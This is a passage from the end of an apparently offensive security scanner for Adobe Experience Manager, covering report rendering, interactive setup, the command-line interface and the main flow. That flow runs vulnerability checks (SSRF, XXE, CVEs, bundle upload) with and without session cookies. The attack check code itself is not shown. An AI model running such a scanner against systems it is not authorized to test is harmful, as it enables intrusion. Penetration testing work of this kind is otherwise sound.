            self.check_ssrf_endpoints()
            self.check_webdav_xxe()
            self.check_cve_2025_54253()
            self.check_legacy_cves()
            self.check_sling_post_servlet()
            self.check_source_disclosure()
            self.check_misc()
            self.check_authenticated_role()
            self.check_bundle_upload()
        except KeyboardInterrupt:
            self.logger.warn("Interrupted by user; producing report with partial findings.")


# ---------------------------------------------------------------------------
# HTML report rendering
# ---------------------------------------------------------------------------
HTML_STYLE = """
* { box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
  background: #0d1117; color: #c9d1d9; padding: 24px;
  max-width: 1200px; margin: 0 auto; line-height: 1.5;
}
h1 { color: #58a6ff; margin-bottom: 4px; }
.target { color: #8b949e; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
.summary { display: flex; gap: 12px; margin: 18px 0; flex-wrap: wrap; }
.card { padding: 10px 16px; border-radius: 6px; font-weight: 600; font-size: 13px; }
.c-CRITICAL { background: #6f1d1f; color: #ffe2dc; }
.c-HIGH { background: #7d2a1e; color: #ffd1c4; }
.c-MEDIUM { background: #745c00; color: #f7e1a1; }
.c-LOW { background: #1f4d6b; color: #c8ecff; }
.c-INFO { background: #2a2f3a; color: #aab2c5; }
.finding {
  background: #161b22; border: 1px solid #30363d; border-radius: 8px;
  padding: 16px 18px; margin: 12px 0;
}
.finding h3 { margin: 0 0 4px 0; color: #f0f6fc; }
.meta { color: #8b949e; font-size: 13px; margin: 6px 0; }
.badge {
  display: inline-block; padding: 2px 8px; border-radius: 4px;
  font-size: 11px; margin-right: 6px; font-weight: 600;
}
.b-CRITICAL { background: #6f1d1f; color: #ffadad; }
.b-HIGH { background: #7d2a1e; color: #ffc4b3; }
.b-MEDIUM { background: #745c00; color: #f7e1a1; }
.b-LOW { background: #1f4d6b; color: #b6e1ff; }
.b-INFO { background: #2a2f3a; color: #aab2c5; }
.b-cve { background: #4d1c1c; color: #ffadad; }
.b-cat { background: #1f3a5f; color: #b6e1ff; }
.b-role { background: #2f4a1f; color: #c9ecb5; }
pre {
  background: #0d1117; border: 1px solid #30363d; padding: 10px;
  border-radius: 4px; overflow-x: auto; font-size: 12px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  white-space: pre-wrap; word-break: break-word;
}
a { color: #58a6ff; text-decoration: none; }
a:hover { text-decoration: underline; }
.foot { color: #8b949e; font-size: 12px; margin-top: 36px;
        border-top: 1px solid #30363d; padding-top: 12px; }
"""


def render_html_report(target: str, findings: List[Finding], summary: Dict[str, int]) -> str:
    sev_cards = "".join(
        f'<div class="card c-{sev}">{sev}: {count}</div>'
        for sev, count in sorted(summary.items(), key=lambda kv: -SEV_ORDER.get(kv[0], 0))
    )

    cards_html: List[str] = []
    for f in findings:
        refs_html = ""
        if f.references:
            refs_html = "<div class='meta'>Refs: " + " &middot; ".join(
                f'<a href="{html_mod.escape(r)}" target="_blank" rel="noopener">{html_mod.escape(r)}</a>'
                for r in f.references) + "</div>"
        cve_badge = (f'<span class="badge b-cve">{html_mod.escape(f.cve)}</span>'
                     if f.cve else "")
        role_badge = (f'<span class="badge b-role">role: {html_mod.escape(f.role)}</span>'
                      if f.role else "")
        req_block = (f'<div class="meta">Request</div><pre>{html_mod.escape(f.request)}</pre>'
                     if f.request else "")
        resp_block = (f'<div class="meta">Response snippet</div><pre>{html_mod.escape(f.response_snippet)}</pre>'
                      if f.response_snippet else "")
        ev_block = (f'<div class="meta">Evidence</div><pre>{html_mod.escape(f.evidence)}</pre>'
                    if f.evidence else "")
        desc_block = (f'<p>{html_mod.escape(f.description)}</p>' if f.description else "")
        cards_html.append(
            f'<div class="finding">'
            f'<h3>{html_mod.escape(f.title)}</h3>'
            f'<div class="meta">'
            f'<span class="badge b-{f.severity}">{f.severity}</span>'
            f'<span class="badge b-cat">{html_mod.escape(f.category)}</span>'
            f'{cve_badge}{role_badge}'
            f'</div>'
            f'<div class="meta">Target: <code>{html_mod.escape(f.target)}</code></div>'
            f'{desc_block}{ev_block}{req_block}{resp_block}{refs_html}'
            f'</div>'
        )

    body = (
        f'<h1>AEM Hunter Report</h1>'
        f'<div class="target">Target: {html_mod.escape(target)}</div>'
        f'<div class="target">Generated: {dt.datetime.now().isoformat(timespec="seconds")}</div>'
        f'<div class="summary">{sev_cards}</div>'
        f'{"".join(cards_html) or "<p>No findings.</p>"}'
        f'<div class="foot">aem-hunter v{VERSION} &middot; for authorized testing only.</div>'
    )

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>AEM Hunter Report - {html_mod.escape(target)}</title>
<style>{HTML_STYLE}</style>
</head>
<body>
{body}
</body>
</html>"""


# ---------------------------------------------------------------------------
# Interactive prompts
# ---------------------------------------------------------------------------
def prompt(text: str, default: Optional[str] = None) -> str:
    suffix = f" [{default}]" if default else ""
    try:
        val = input(f"{text}{suffix}: ").strip()
    except EOFError:
        return default or ""
    return val or (default or "")


def prompt_yes_no(text: str, default: bool = False) -> bool:
    yn = "Y/n" if default else "y/N"
    val = prompt(f"{text} ({yn})").lower()
    if not val:
        return default
    return val.startswith("y")


def interactive_setup() -> Dict[str, Any]:
    print(BANNER.format(ver=VERSION))
    print("Interactive mode. Press Enter to accept defaults.\n")

    target = ""
    while not target:
        target = prompt("Target URL (e.g. https://aem.example.com)")
    target = normalize_target(target)

    use_cookies = prompt_yes_no("Do you have an authenticated session to test with?",
                                default=False)
    cookie_specs: List[Tuple[Optional[str], Dict[str, str]]] = []
    if use_cookies:
        print("\nFor each role, paste the full Cookie header value or an absolute "
              "path to a file containing it. Leave blank to stop.\n")
        while True:
            role = prompt("  Role label (or blank to finish)").strip()
            if not role:
                break
            raw = prompt("  Cookie header (or @/path/to/file)").strip()
            if raw.startswith("@"):
                try:
                    with open(raw[1:], "r") as fh:
                        raw = fh.read().strip()
                except OSError as e:
                    print(f"  ! Could not read file: {e}")
                    continue
            cookies = parse_cookie_string(raw)
            if not cookies:
                print("  ! No cookies parsed; skipping.")
                continue
            cookie_specs.append((role, cookies))
            print(f"  + Added role '{role}' with {len(cookies)} cookies.\n")

    basic_auth_raw = prompt("HTTP Basic auth (user:pass) or blank")
    basic_auth = parse_basic_auth(basic_auth_raw) if basic_auth_raw else None

    proxy = prompt("Outbound proxy (e.g. http://127.0.0.1:8080) or blank")
    threads_str = prompt("Concurrent threads", "10")
    try:
        threads = max(1, int(threads_str))
    except ValueError:
        threads = 10

    aggression = prompt("Fuzz aggression [quick/normal/aggressive]", "normal").lower()
    if aggression not in ("quick", "normal", "aggressive"):
        aggression = "normal"

    output_dir = prompt("Output directory", ".")

    return {
        "target": target,
        "cookie_specs": cookie_specs,
        "basic_auth": basic_auth,
        "proxy": proxy or None,
        "threads": threads,
        "aggression": aggression,
        "output_dir": output_dir,
    }


# ---------------------------------------------------------------------------
# Reporting outputs
# ---------------------------------------------------------------------------
def write_reports(target: str, findings: List[Finding], summary: Dict[str, int],
                  output_dir: str, logger: Logger) -> None:
    os.makedirs(output_dir, exist_ok=True)
    ts = dt.datetime.now().strftime("%Y%m%d-%H%M%S")
    host = short_host(target)
    base = os.path.join(output_dir, f"report-{host}-{ts}")
    json_path = base + ".json"
    html_path = base + ".html"

    with open(json_path, "w") as fh:
        json.dump({
            "tool": "aem-hunter",
            "version": VERSION,
            "target": target,
            "generated": dt.datetime.now().isoformat(timespec="seconds"),
            "summary": summary,
            "findings": [asdict(f) for f in findings],
        }, fh, indent=2)
    logger.good(f"JSON report: {json_path}")

    with open(html_path, "w") as fh:
        fh.write(render_html_report(target, findings, summary))
    logger.good(f"HTML report: {html_path}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
ALL_MODULES = {
    "creds", "exposure", "dispatcher", "sling", "querybuilder",
    "groovy", "ssrf", "xxe", "cve", "slingpost", "source", "misc",
    "role", "bundle",
}


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="aem_hunter.py",
        description="Adobe Experience Manager offensive audit tool. "
                    "Single-file scanner for authorized testing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python3 aem_hunter.py
              python3 aem_hunter.py -u https://target.example.com
              python3 aem_hunter.py -u TARGET --cookie "login-token=...; cq-..."
              python3 aem_hunter.py -u TARGET --basic-auth admin:admin
              python3 aem_hunter.py -u TARGET --modules dispatcher,querybuilder,cve
              python3 aem_hunter.py -u TARGET --proxy http://127.0.0.1:8080 -k
            """),
    )
    p.add_argument("-u", "--url", help="Target base URL (e.g. https://aem.example.com)")
    p.add_argument("--cookie", action="append", default=[],
                   help="Cookie header value (can be repeated)")
    p.add_argument("--cookie-role", action="append", default=[],
                   help="Per-role cookies as 'role-label:cookie-string'. Repeat per role.")
    p.add_argument("--cookie-file", action="append", default=[],
                   help="Path to a file containing the Cookie header (repeatable).")
    p.add_argument("--basic-auth", help="HTTP Basic auth, user:pass")
    p.add_argument("--header", action="append", default=[],
                   help="Custom header 'Name: value' (repeatable)")
    p.add_argument("--proxy", help="Outbound proxy URL (http://host:port)")
    p.add_argument("-k", "--insecure", action="store_true", help="Disable TLS verification")
    p.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads (default 10)")
    p.add_argument("--timeout", type=int, default=15, help="Per-request timeout in seconds")
    p.add_argument("--rate-limit", type=float, default=0.0,
                   help="Max requests per second (0 = unlimited)")
    p.add_argument("--modules", help=f"Comma-separated module subset (any of: {','.join(sorted(ALL_MODULES))})")
    p.add_argument("--aggression", choices=("quick", "normal", "aggressive"), default="normal",
                   help="Fuzzing aggression for dispatcher / selector probes")
    p.add_argument("-o", "--output-dir", default=".", help="Where to write JSON / HTML reports")
    p.add_argument("--user-agent", help="Override the User-Agent header")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose debug output")
    p.add_argument("--no-color", action="store_true", help="Disable ANSI colour output")
    p.add_argument("--no-interactive", action="store_true",
                   help="Skip interactive prompts even if target/cookies missing")
    p.add_argument("--version", action="version", version=f"aem-hunter {VERSION}")
    return p.parse_args()


def build_cookie_specs_from_args(ns: argparse.Namespace) -> List[Tuple[Optional[str], Dict[str, str]]]:
    out: List[Tuple[Optional[str], Dict[str, str]]] = []
    for c in ns.cookie:
        cookies = parse_cookie_string(c)
        if cookies:
            out.append((None, cookies))
    for cf_path in ns.cookie_file:
        try:
            with open(cf_path, "r") as fh:
                raw = fh.read().strip()
                cookies = parse_cookie_string(raw)
                if cookies:
                    out.append((None, cookies))
        except OSError as e:
            sys.stderr.write(f"[!] Could not read cookie file {cf_path}: {e}\n")
    for entry in ns.cookie_role:
        if ":" not in entry:
            sys.stderr.write(f"[!] --cookie-role expects 'role:cookie-string', got {entry!r}\n")
            continue
        role, raw = entry.split(":", 1)
        cookies = parse_cookie_string(raw)
        if cookies:
            out.append((role.strip() or None, cookies))
    return out


def main() -> int:
    ns = parse_args()
    logger = Logger(verbose=ns.verbose, no_color=ns.no_color)

    print(BANNER.format(ver=VERSION))

    # Interactive vs. CLI flow
    if not ns.url and not ns.no_interactive:
        cfg = interactive_setup()
        target = cfg["target"]
        cookie_specs = cfg["cookie_specs"]
        basic_auth = cfg["basic_auth"]
        proxy = cfg["proxy"]
        threads = cfg["threads"]
        aggression = cfg["aggression"]
        output_dir = cfg["output_dir"]
        custom_headers: Dict[str, str] = {}
        insecure = True
        timeout = 15
        rate_limit = 0.0
        user_agent = None
        enable_modules = None
    else:
        if not ns.url:
            logger.err("Missing target URL (--url). Use interactive mode or pass --url.")
            return 2
        target = normalize_target(ns.url)
        cookie_specs = build_cookie_specs_from_args(ns)
        basic_auth = parse_basic_auth(ns.basic_auth) if ns.basic_auth else None
        proxy = ns.proxy
        threads = ns.threads
        aggression = ns.aggression
        output_dir = ns.output_dir
        custom_headers = {}
        for h in ns.header:
            if ":" in h:
                k, v = h.split(":", 1)
                custom_headers[k.strip()] = v.strip()
        insecure = ns.insecure or True  # default to skip TLS verify in pentest context
        timeout = ns.timeout
        rate_limit = ns.rate_limit
        user_agent = ns.user_agent
        enable_modules = None
        if ns.modules:
            chosen = {m.strip() for m in ns.modules.split(",") if m.strip()}
            unknown = chosen - ALL_MODULES
            if unknown:
                logger.err(f"Unknown modules: {sorted(unknown)}. Available: {sorted(ALL_MODULES)}")
                return 2
            enable_modules = chosen

    logger.info(f"Target: {target}")
    logger.info(f"Threads: {threads} | Aggression: {aggression} | Modules: "
                f"{'all' if enable_modules is None else ','.join(sorted(enable_modules))}")
    if proxy:
        logger.info(f"Proxy: {proxy}")
    if basic_auth:
        logger.info(f"Basic auth: {basic_auth[0]}:***")
    if cookie_specs:
        logger.info(f"Authenticated roles to test: {len(cookie_specs)}")

    reporter = Reporter(logger)

    # ---- Unauthenticated pass ----
    logger.section("=== UNAUTHENTICATED PASS ===")
    unauth_client = HttpClient(
        base_url=target, timeout=timeout, proxy=proxy, threads=threads,
        verify=not insecure, user_agent=user_agent,
        custom_headers=custom_headers or None,
        basic_auth=basic_auth, rate_limit=rate_limit, logger=logger,
    )
    hunter = AEMHunter(
        target=target, logger=logger, reporter=reporter,
        client=unauth_client, threads=threads, role=None,
        enable_modules=enable_modules, fuzz_aggression=aggression,
    )
    hunter.run()

    # ---- Authenticated passes per role ----
    for role, cookies in cookie_specs:
        label = role or "session"
        logger.section(f"=== AUTHENTICATED PASS ({label}) ===")
        auth_client = HttpClient(
            base_url=target, timeout=timeout, proxy=proxy, threads=threads,
            verify=not insecure, user_agent=user_agent, cookies=cookies,
            custom_headers=custom_headers or None,
            basic_auth=basic_auth, rate_limit=rate_limit, logger=logger,
        )
        role_hunter = AEMHunter(
            target=target, logger=logger, reporter=reporter,
            client=auth_client, threads=threads, role=label,
            enable_modules=enable_modules, fuzz_aggression=aggression,
        )
        role_hunter.run()

    # ---- Summary + reports ----
    summary = reporter.summary()
    logger.section("Summary")
    for sev in (SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM, SEV_LOW, SEV_INFO):
        logger.finding(sev, f"{summary.get(sev, 0)} {sev} findings")

    write_reports(target, reporter.by_severity(), summary, output_dir, logger)

    # Exit code reflects severity ceiling for CI use
    if summary.get(SEV_CRITICAL, 0) > 0:
        return 4
    if summary.get(SEV_HIGH, 0) > 0:
        return 3
    if summary.get(SEV_MEDIUM, 0) > 0:
        return 2
    if summary.get(SEV_LOW, 0) > 0:
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
